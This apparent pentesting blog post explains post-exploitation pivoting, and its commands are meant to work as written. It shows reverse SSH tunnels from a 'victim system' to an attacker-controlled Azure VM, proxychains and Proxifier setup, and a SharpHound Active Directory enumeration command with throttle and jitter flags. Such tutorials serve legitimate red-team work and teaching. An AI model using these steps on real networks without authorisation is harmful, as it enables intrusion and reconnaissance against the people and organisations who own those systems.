---
title: "Proxying and tunneling, made simple"
date: 2026-01-11T00:00:00Z
draft: false
description: "Help and instructions on how to tunnel and proxy"
---
I hate networking; the setup and everything about it gives me a headache. Hopefully this article will help simplfy some of the easier tunneling setups.

{{< image src="/assets/proxy/frank.gif" alt="" width="400" linked="false" class="center-image" >}} 

This article will show how to ensure that we have access to the tools that we want after gaining access to a victim system.

This article will use four systems - the victim system (ssh & internet enabled), an Azure Kali CLI VM with a publicly accessible IP, our personal Kali VM with a private IP, and our personal Windows VM with a private IP.

## Run CLI tools directly from Azure Kali CLI VM
From the victim system open a reverse port forward: ```ssh -i key.pem -R 1080 -p <port>> -N <user>>@<Azure IP>> -v```

Then simply connect to the Azure VM and run tools with proxychains.

## Run tools from my local Kali VM
Sometimes we want to run a tool that needs a GUI or we like our personal VM setup better.

From the victim system run the same command to open a reverse port forward: ```ssh <user>@<Azure IP> -p <port>> -i key.pem -R 127.0.0.1:1080```

Then from your local VM open a local port forward: ```ssh <user>@<Azure IP> -p <port> -i key.pem -L 127.0.0.1:1080:127.0.0.1:1080```

Then we can run tools same as we usually would using proxychains.

## Running tools from my local Windows VM
I have found that running SharpHound.exe instead of bloodhound-python is much faster and some Windows based tools are just better. In cases where we need to run Windows tools we will use Proxifier.

Let's start with the same setup as in the previous example.

From the victim system run the same command to open a reverse port forward: ```ssh <user>@<Azure IP> -p <port>> -i key.pem -R 127.0.0.1:9050```

Then from your local VM open a local port forward: ```ssh <user>@<Azure IP> -p <port> -i key.pem -L 127.0.0.1:9050:127.0.0.1:9050```

Open Proxifier and setup a Proxy Server.
{{< image src="/assets/proxy/server.png" alt="" width="400" linked="false" class="center-image" >}} 

Add a Proxification rule that will send the traffic we want through the Proxy Server.
{{< image src="/assets/proxy/rules.png" alt="" width="400" linked="false" class="center-image" >}} 

Edit the Proxification rule to our specifications, I like specifying *.FQDN and any IPs.

{{< image src="/assets/proxy/rule.png" alt="" width="400" linked="false" class="center-image" >}} 

Last we want to make sure that we resolve hostnames through the proxy.

{{< image src="/assets/proxy/dns.png" alt="" width="400" linked="false" class="center-image" >}} 

The next step is to open a cmd window and open a runas session through the proxy.

From your cmd.exe window: ```runas /netonly /user:ad1.prod\username powershell.exe```.

Now we have a new runas window where we can finally run SharpHound.exe.

```.\SharpHound.exe -c DCOnly -d ad1.prod --ldapusername "username" --ldappassword "password" --domaincontroller <DC IP> --throttle 5000 --jitter 40 -v 4```

Quick note, if SharpHound.exe isn't working try another version, some versions have issues that will not work as they should.

The best part of running tools through Proxifier is that you can see the amount of data sent and received, so long as the data sent/received is increasing you know the program is running through Proxifier correctly. 